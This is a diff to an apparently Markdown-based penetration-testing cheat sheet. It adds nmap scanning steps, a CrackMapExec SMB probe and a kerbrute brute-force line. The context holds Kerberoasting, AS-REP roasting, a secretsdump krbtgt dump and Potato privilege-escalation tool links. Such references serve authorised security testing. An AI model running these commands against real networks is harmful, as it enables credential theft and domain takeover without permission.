@@ -9,6 +9,15 @@
 ### Scanning
 
 ```bash
+# BEST - https://miloserdov.org/?p=5248
+# discover
+sudo nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oX nmap_output.xml $network_ip
+# extract the hosts
+grep -A 2 'up' nmap_output.xml | grep -E -o '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' > hosts.txt
+# scan them, find routers
+sudo nmap -v -PE -n --min-hostgroup 1024 --min-parallelism 1024 -p 80,443,8080,1080 --open -iL hosts.txt -oX nmap_routers.xml
+
+# OTHERS
 # Ping discovery, Top 20, fragment packets, no DNS resolution
 nmap -v --top-ports 20 $ip/24 -f -n --open -oA
 # Ping discovery, Top 200, fragment packets, no DNS resolution, service version
@@ -26,6 +35,9 @@ Check this
 ### If you have no credentials
 
 ```bash
+# get basic infos
+cme smb $ip
+
 # Detect SMB on network
 responder-RunFinger -i X.X.X.0/24
 
@@ -75,7 +87,7 @@ Get-NetComputer
 # Kerberoasting (hashcat 13100)
 GetUserSPNs.py -request -save -dc-ip <IP> domain/user # hashcat 13100
 
-# BF
+# Bruteforce usernames and passwords with kerbrute
 kerbrute.py -d <DC.LOCAL> -users <users_file> -passwords <passwords_file> -outputfile <output_file>
 
 # ASREPRoast (hashcat 18200)
@@ -169,10 +181,10 @@ secretsdump.py '<DC.NAME>/<User>@<DC.IP>' -just-dc-user krbtgt
 
 ### Local Privilege Escalation
 
-#### Juicy Potato&#x20;
+#### Juicy Potato
 
 {% hint style="info" %}
-#### Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation
+**Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation**
 
 Works only until Windows Server 2016 and Windows 10 until patch 1803.
 {% endhint %}
@@ -181,20 +193,20 @@ Works only until Windows Server 2016 and Windows 10 until patch 1803.
 
 {% embed url="https://github.com/TsukiCTF/Lovely-Potato" %}
 
-#### PrintSpoofer&#x20;
+#### PrintSpoofer
 
 {% hint style="info" %}
-#### Exploit the PrinterBug for System Impersonation
+**Exploit the PrinterBug for System Impersonation**
 
 Works for Windows Server 2019 and Windows 10.
 {% endhint %}
 
 {% embed url="https://github.com/itm4n/PrintSpoofer" %}
 
-#### RoguePotato&#x20;
+#### RoguePotato
 
 {% hint style="info" %}
-#### From Service Account to System
+**From Service Account to System**
 
 Works for Windows Server 2019 and Windows 10.
 {% endhint %}
@@ -218,7 +230,7 @@ Works for Windows Server 2019 and Windows 10.
 ### Lynis
 
 {% hint style="info" %}
-Lynis is a **battle-tested security tool** for systems running Linux, macOS, or Unix-based operating system. It performs an extensive health scan of your systems to support system hardening and compliance testing.&#x20;
+Lynis is a **battle-tested security tool** for systems running Linux, macOS, or Unix-based operating system. It performs an extensive health scan of your systems to support system hardening and compliance testing.
 {% endhint %}
 
 In order to install **Lynis** on your system, you must follow these steps :
